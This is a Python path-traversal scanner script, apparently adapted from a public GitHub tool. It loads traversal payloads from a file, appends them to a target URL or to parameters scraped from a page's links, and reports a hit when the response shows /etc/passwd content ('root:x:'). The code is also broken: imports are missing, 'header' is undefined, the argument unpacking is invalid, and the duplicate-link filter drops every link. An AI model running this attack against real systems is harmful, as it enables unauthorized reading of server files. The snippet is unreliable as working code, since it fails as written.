# Reference: https://github.com/gotr00t0day/PathTraversal/blob/main/pathhunt.py
# Date: Jun 7, 2023

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target',
                   help="Target to scan",
                   metavar="https://www.domain.com")
parser.add_argument('-p', '--parameters',
                   help="Target to scan",
                   metavar="https://www.domain.com")

args.target, args.parameters = parser.parse_args()

if args.target:
    cdir = os.getcwd()
    with open(f"{cdir}/payloads/traversal.txt", "r") as f:
        path_traversal_list = [x.strip() for x in f.readlines()]
    vulnerable = []
    for path_traversal in path_traversal_list:
        s = requests.Session()
        r = s.get(f"{args.target}{path_traversal}", verify=False, headers=header)
        if r.status_code == 200 and "root:x:" in r.text:
            vulnerable.append(f"{args.target}{path_traversal}")

if args.parameters:
    s = requests.Session()
    r = s.get(args.parameters, verify=False, headers=header)
    content = r.content
    links = re.findall('(?:href=")(.*?)"', content.decode('utf-8'))
    links2 =  re.findall('(?:src=")(.*?)"', content.decode('utf-8'))
    duplicatelinks = set(links)
    params_links = []
    for link in links:
        link = urljoin(args.parameters, link)
        if link not in duplicatelinks:
            if "=" in link:
                params_links.append(link + "\n")
    for src_links in links2:
        src_links = urljoin(args.parameters, src_links)
        if src_links not in duplicatelinks:
            if "=" in src_links:
                params_links.append(src_links + "\n")
    parameters_list: list[str] = []
    vulnerable: list[str] = []
    for params2 in params_links:
        parameters = params2.split("=")[0]
        parameters_list.append(f"{parameters}=")
    cdir = os.getcwd()
    with open(f"{cdir}/payloads/traversal.txt", "r") as f:
        path_traversal_list = [x.strip() for x in f.readlines()]
    for parameterslist in parameters_list:
        for path_list in path_traversal_list:
            r_traversal = requests.get(f"{parameterslist}{path_list}", verify=False, headers=header)
            if r_traversal.status_code == 200 and "root:x:" in r_traversal.text:
                vulnerable.append(f"{parameterslist}{path_list}")